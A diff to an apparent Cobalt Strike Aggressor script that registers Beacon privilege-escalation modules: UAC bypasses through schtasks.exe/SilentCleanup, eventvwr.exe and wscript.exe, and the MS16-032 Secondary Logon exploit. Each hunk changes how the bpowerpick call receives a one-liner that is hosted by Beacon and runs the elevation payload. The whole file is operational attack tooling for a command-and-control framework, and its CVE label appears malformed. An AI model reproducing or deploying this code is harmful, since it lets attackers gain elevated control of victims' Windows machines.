@@ -22,7 +22,7 @@ sub schtasks_elevator {
 	$command  = transform($2, "powershell-base64");
 
 	# run the specified command via this exploit.
-	bpowerpick!($1, "$oneliner $+ ; Invoke-EnvBypass -Command \" $+ $command $+ \"");
+	bpowerpick!($1, "Invoke-EnvBypass -Command \" $+ $command $+ \"", $oneliner);
 }
 
 beacon_elevator_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);
@@ -51,7 +51,7 @@ sub schtasks_exploit {
 	$payload_oneliner = transform($payload_oneliner, "powershell-base64");
 
 	# run the specified command via this exploit.
-	bpowerpick!($1, "$exploit_oneliner $+ ; Invoke-EnvBypass -Command \" $+ $payload_oneliner $+ \"");
+	bpowerpick!($1, "Invoke-EnvBypass -Command \" $+ $payload_oneliner $+ \"", $exploit_oneliner);
 
 	# link to our payload if it's a TCP or SMB Beacon
 	beacon_link($1, $null, $2);
@@ -76,7 +76,7 @@ sub eventvwr_elevator {
 	$oneliner = beacon_host_script($1, $script);
 
 	# run the specified command via this exploit.
-	bpowerpick!($1, "$oneliner $+ ; Invoke-EventVwrBypass -Command \" $+ $2 $+ \"");
+	bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $2 $+ \"", $oneliner);
 }
 
 beacon_elevator_register("uac-eventvwr", "Bypass UAC with eventvwr.exe", &eventvwr_elevator);
@@ -98,7 +98,7 @@ sub wscript_elevator {
 	$oneliner = beacon_host_script($1, $script);
 
 	# run the specified command via this exploit.
-	bpowerpick!($1, "$oneliner $+ ; Invoke-WScriptBypassUAC -payload \" $+ $oneliner $+ \"");
+	bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $2 $+ \"", $oneliner);
 }
 
 beacon_elevator_register("uac-wscript", "Bypass UAC with wscript.exe", &wscript_elevator);
@@ -206,7 +206,7 @@ sub ms16_032_elevator {
 	$oneliner = beacon_host_script($1, $script);
 
 	# run the specified command via this exploit.
-	bpowerpick!($1, "$oneliner $+ ; Invoke-MS16032 -Command \" $+ $2 $+ \"");
+	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $2 $+ \"", $oneliner);
 }
 
 beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
